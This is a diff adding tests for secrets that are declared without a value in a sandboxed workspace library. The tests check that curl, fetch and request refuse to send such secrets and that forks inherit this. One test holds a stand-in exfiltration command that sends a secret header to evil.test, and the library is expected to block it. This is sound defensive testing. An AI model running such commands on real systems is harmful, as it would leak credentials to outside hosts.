@@ -2,14 +2,20 @@ import { existsSync } from 'node:fs'
 import { fileURLToPath } from 'node:url'
 import { beforeAll, describe, expect, it } from 'vitest'
 import {
+  DeclaredSecretError,
   InvalidNameError,
+  NetError,
   type Profile,
   type SecretSpec,
+  Secrets,
   Store,
   type Workspace,
   curlCommand,
   hostFactory,
   httpHost,
+  request,
+  toolInstructions,
+  worldTools,
 } from '../src/index'
 import { newKV } from './backends'
 
@@ -175,6 +181,183 @@ describe('host objects made with the secrets', () => {
     const out = await ws.runCode('return [await api.keyLength(), await api.origins()]')
     expect(out.value).toBe('[14,["https://api.good.test"]]')
     await ws.close()
+  })
+})
+
+describe('secrets declared without a value', () => {
+  const HELD =
+    'secret HELD has no value here: the host holds it, so the request must go through a host object that fills it'
+  const declared: Profile = {
+    secrets: { ...SECRETS, HELD: { origins: ['https://api.held.test'] } },
+  }
+
+  it('are listed as a secret with a value is', async () => {
+    const { fetch } = fakeFetch(() => new Response('ok'))
+    const texts = async (held: SecretSpec) => {
+      const ws = await open(fetch, { secrets: { ...SECRETS, HELD: held } })
+      const tools = worldTools(ws)
+      const out = [...tools.map((t) => t.description), await toolInstructions(ws)]
+      await ws.close()
+      return out
+    }
+    const withValue = await texts({ value: 'held-secret-333', origins: ['https://api.held.test'] })
+    expect(withValue.join('\n')).toContain('$HELD')
+    expect(await texts({ origins: ['https://api.held.test'] })).toEqual(withValue)
+  })
+
+  it('give their reference in the shell and in code', async () => {
+    const { fetch } = fakeFetch(() => new Response('ok'))
+    const ws = await open(fetch, declared)
+    expect((await ws.terminal('echo "$HELD ${HELD}"')).stdout).toBe('${HELD} ${HELD}\n')
+    expect((await ws.runCode(`return secret('HELD')`)).value).toBe('${HELD}')
+    await ws.close()
+  })
+
+  it('curl refuses a request carrying one, and sends nothing', async () => {
+    const { fetch, seen } = fakeFetch(() => new Response('ok'))
+    const ws = await open(fetch, declared)
+    for (const command of [
+      'curl -H "X-Key: $HELD" https://api.held.test/x',
+      "curl 'https://api.held.test/x?k=$HELD'",
+    ]) {
+      const r = await ws.terminal(command)
+      expect(r.exitCode).toBe(3)
+      expect(r.stderr).toBe(`curl: (3) ${HELD}`)
+    }
+    const elsewhere = await ws.terminal('curl -H "X-Key: $HELD" https://evil.test/x')
+    expect(elsewhere.stderr).toBe(
+      'curl: (3) URL rejected: secret HELD may not be sent to https://evil.test',
+    )
+    expect(seen).toHaveLength(0)
+    await ws.close()
+  })
+
+  it('http.fetch refuses a request carrying one, and sends nothing', async () => {
+    const { fetch, seen } = fakeFetch(() => new Response('ok'))
+    const ws = await open(fetch, declared)
+    const out = await ws.runCode(`
+      try {
+        await http.fetch('https://api.held.test/', { headers: { 'X-Key': secret('HELD') } })
+      } catch (e) {
+        return e.name + ': ' + e.message
+      }
+    `)
+    expect(out.value).toBe(`NetError: ${HELD}`)
+    expect(seen).toHaveLength(0)
+    await ws.close()
+  })
+
+  it('request() refuses one, and sends nothing', async () => {
+    const { fetch, seen } = fakeFetch(() => new Response('ok'))
+    const secrets = new Secrets({ HELD: { origins: ['https://api.held.test'] } })
+    const sent = request(
+      { url: 'https://api.held.test/', headers: [['X-Key', 'Bearer ${HELD}']] },
+      secrets,
+      { fetch },
+    )
+    await expect(sent).rejects.toThrow(NetError)
+    await expect(sent).rejects.toThrow(HELD)
+    expect(seen).toHaveLength(0)
+  })
+
+  it('a plain host object gets the reference unfilled, to send on', async () => {
+    const { fetch } = fakeFetch(() => new Response('ok'))
+    const got: unknown[] = []
+    const ws = await open(fetch, {
+      ...declared,
+      hostObjects: {
+        relay: {
+          fetch: (url: string, init: { headers: Record<string, string> }) => {
+            got.push([url, init.headers])
+            return 'sent'
+          },
+        },
+      },
+    })
+    const out = await ws.runCode(`
+      return await relay.fetch('https://api.held.test/x', {
+        headers: { Authorization: 'Bearer ' + secret('HELD') },
+      })
+    `)
+    expect(out.value).toBe('sent')
+    expect(got).toEqual([['https://api.held.test/x', { Authorization: 'Bearer ${HELD}' }]])
+    await ws.close()
+  })
+
+  it('secrets.get throws for one, and declared() tells it apart', async () => {
+    const { fetch } = fakeFetch(() => new Response('ok'))
+    const ws = await open(fetch, {
+      ...declared,
+      hostObjects: {
+        api: hostFactory((_ws, { secrets }) => ({
+          probe: () => {
+            const seen: unknown[] = [
+              secrets.names(),
+              secrets.declared('HELD'),
+              secrets.declared('FREE'),
+            ]
+            try {
+              secrets.get('HELD')
+            } catch (e) {
+              seen.push((e as Error).name)
+            }
+            return [...seen, secrets.get('FREE'), secrets.origins('HELD')]
+          },
+        })),
+      },
+    })
+    const out = await ws.runCode('return await api.probe()')
+    expect(JSON.parse(out.value as string)).toEqual([
+      ['BOUND', 'FREE', 'HELD'],
+      true,
+      false,
+      'DeclaredSecretError',
+      'free-secret-22',
+      ['https://api.held.test'],
+    ])
+    expect(() => new Secrets({ HELD: { origins: ['https://a.test'] } }).get('HELD')).toThrow(
+      DeclaredSecretError,
+    )
+    await ws.close()
+  })
+
+  it('leave secrets with a value as they were, echo scrubbing included', async () => {
+    const { fetch, seen } = fakeFetch((req) => new Response(`echo ${req.headers['x-key']}`))
+    const ws = await open(fetch, declared)
+    const r = await ws.terminal('curl -H "X-Key: $BOUND" https://api.good.test/x')
+    expect(r.exitCode).toBe(0)
+    expect(seen[0]?.headers['x-key']).toBe('bound-secret-1')
+    expect(r.stdout).toBe('echo ${BOUND}')
+    expect(new Secrets(declared.secrets).scrub('free-secret-22 ${HELD}')).toBe('${FREE} ${HELD}')
+    await ws.close()
+  })
+
+  it('are inherited by a fork', async () => {
+    const { fetch, seen } = fakeFetch(() => new Response('ok'))
+    const ws = await open(fetch, declared)
+    const child = await ws.fork('child')
+    expect((await child.terminal('echo $HELD')).stdout).toBe('${HELD}\n')
+    const r = await child.terminal('curl -H "X-Key: $HELD" https://api.held.test/x')
+    expect(r.stderr).toBe(`curl: (3) ${HELD}`)
+    expect((await child.runCode(`return secret('HELD')`)).value).toBe('${HELD}')
+    expect(seen).toHaveLength(0)
+    await child.close()
+    await ws.close()
+  })
+
+  it('a profile declares one with real origins', async () => {
+    const store = await Store.open(await newKV())
+    await expect(
+      store.open('s', { profile: { secrets: { X: { origins: ['not a url'] } } } }),
+    ).rejects.toThrow(InvalidNameError)
+    await expect(store.open('s', { profile: { secrets: { X: { origins: [] } } } })).rejects.toThrow(
+      TypeError,
+    )
+    await expect(
+      store.open('s', {
+        profile: { secrets: { X: { value: 3, origins: ['https://a.test'] } as never } },
+      }),
+    ).rejects.toThrow(TypeError)
   })
 })
 
